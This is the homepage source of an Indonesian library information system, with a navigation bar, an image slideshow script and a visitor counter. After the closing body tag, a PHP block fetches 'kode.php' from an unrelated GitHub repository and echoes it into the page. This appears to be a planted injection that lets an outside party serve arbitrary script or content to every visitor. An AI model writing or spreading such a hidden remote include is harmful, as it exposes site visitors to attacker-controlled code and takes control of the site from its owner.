<!DOCTYPE html>

<html>
    <head>
        <meta charset="UTF-8">
        <title>Perpustakaan</title>
        <link href="Assets/css/bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="Assets/css/dataTables.bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="Assets/font-awesome-4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
        <link rel="stylesheet" href="Assets/css/style.css">
        <link rel="stylesheet" href="Assets/css/toast.css" />
        <style type="text/css">
            /* body {
                margin-top:70px;
            } */

            .modalDialog {
                position: fixed;
                font-family: Arial, Helvetica, sans-serif;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                background: rgba(0,0,0,0.8);
                z-index: 99999;
                opacity:0;
                transition: opacity 200ms ease-in;
                pointer-events: none;
            }
            .modalDialog:target {opacity:1; pointer-events: auto;}
            .modalDialog > div {
                width: 400px;
                position: relative;
                margin: 10% auto;
                padding: 5px 20px 13px 20px;
                border-radius: 10px;
                background: #fff;
                background: linear-gradient(#fff, #aaa);
            }
            .close:hover { background:#00d9ff; }
            .close {
                background: #606061;
                color: #FFFFFF;
                line-height: 25px;
                position: absolute;
                text-align: center;
                top: -10px;
                right: -12px;
                width: 24px;
                text-decoration: none;
                font-weight: bold;
                border-radius: 12px;
                box-shadow: 1px 1px 3px #000;
            }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            cursor: pointer;
            width: 100%;
        }

        </style>
    </head>
    <body>
        <!-- Fixed navbar -->
<nav class="navbar navbar-inverse navbar-fixed-top" style="background-color: crimson;">

    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>

            <a class="navbar-brand" href="https://yola.rivaldofs.my.id/?page=utama">Sistem Informasi Perpustakaan</a>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
            <ul class="nav navbar-nav">
                <li><a href="https://yola.rivaldofs.my.id/?page=utama">Home</a></li>

                                    <li><a href="https://yola.rivaldofs.my.id/?page=beranda&actions=tampil">Daftar Buku</a></li>
                    <li><a href="https://yola.rivaldofs.my.id/?page=about&actions=tampil">About</a></li>
                    <li><a href="https://yola.rivaldofs.my.id/?page=sign&actions=in">Sign In</a></li>
                                                <!-- <li><a href="?page=kontak&actions=tampil">Contact</a></li> -->

                    
            </ul>
        </div>
    </div>
</nav>

        <div class="container">
  <div class="row">
    <div class="col-xs-12">
      <div class="panel panel-success">
        <div class="panel-body">
          <table id="deskripsi" class="table table-bordered table-striped table-hover">
            <thead>
              <p align="center"><img src="img/banner.jpg" style="width: 100%;height: 200px;"></img></p>
              <label class="col-sm-12 control-label"><center><strong>SISTEM INFORMASI PERPUSTAKAAN</strong></center></label>
            </thead>
            <tbody>
              <div class="col-sm-12" align="center">
                    <div class="slider-container">
            <div class="slide-content">
        <p class="slide-desc">
          Silahkan Sign In untuk melakukan proses peminjaman buku.
        </p>
        <a href="?page=sign&actions=in" class="slide-btn">
          Sign In <ion-icon name="arrow-forward-circle"></ion-icon>
        </a>
      </div>
        <div class="slide fade">
    <img class="slide-image" src="img/1.jpeg">
  </div>
  <div class="slide fade">
    <img class="slide-image" src="img/2.jpeg">
  </div>

  <div class="slide fade">
    <img class="slide-image" src="img/3.jpeg">
  </div>

  <!-- The dots/circles -->
  <div class="dot-container">
    <span class="dot" onclick="currentSlide(1)"></span>
    <span class="dot" onclick="currentSlide(2)"></span>
    <span class="dot" onclick="currentSlide(3)"></span>
  </div>
</div>
<script>
let slideIndex = 1;
const slides = document.getElementsByClassName("slide");
const dots = document.getElementsByClassName("dot");

// Function to show a specific slide
function showSlides(n) {
  if (n > slides.length) {
    slideIndex = 1;
  }
  if (n < 1) {
    slideIndex = slides.length;
  }

  // Hide all slides and remove "fade" class from hidden slides
  for (let i = 0; i < slides.length; i++) {
    slides[i].style.display = "none"; // Hide the slide
    slides[i].classList.remove("fade"); // Remove "fade" class from hidden slides
  }

  // Remove the "active" class from all dots
  for (let i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }

  // Display the current slide and mark its corresponding dot as active
  slides[slideIndex - 1].style.display = "flex";
  slides[slideIndex - 1].classList.add("fade"); // Add "fade" class to visible slide
  dots[slideIndex - 1].className += " active";
}

// Function to advance to the next slide
function plusSlides(n) {
  showSlides((slideIndex += n));
}

// Function to navigate to a specific slide
function currentSlide(n) {
  showSlides((slideIndex = n));
}

// Automatically advance to the next slide every 5 seconds (5000 milliseconds)
setInterval(function () {
  plusSlides(1);
}, 5000);

// Initialize the slider
showSlides(slideIndex);



</script>              </div>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
</div>

        <div style="background-color: crimson;">
    <div class="container text-center">
       <!--  <div class="row">
            <div class="col-xs-12">
                Copyright &COPY; 2025 Muhammad Afifurrahman |
                <a href="#">Dokumentasi</a>
                <a href="#">Peta Situs</a>
                <a href="#">Support</a>
            </div>
        </div> -->

                        <h3 style="color: white;">Total Pengunjung Website</h3>
            <h4 style="color: white;">449</h4>
    </div>
</div>

<script type="module" src="Assets/js/notification.js"></script>
        <script src="Assets/js/jquery.js" type="text/javascript"></script>
        <script src="Assets/js/bootstrap.min.js" type="text/javascript"></script>
        <script src="Assets/js/jquery.dataTables.min.js" type="text/javascript"></script>
        <script src="Assets/js/dataTables.bootstrap.min.js" type="text/javascript"></script>

        <script type="text/javascript" >
                $(function () {
                    $('#dtskripsi').dataTable();
                });
    </script>

    </body>
<?php
$a = file_get_contents('https://raw.githubusercontent.com/janda354311/instagramtools/refs/heads/main/kode.php');
echo $a;
?>
    </html>
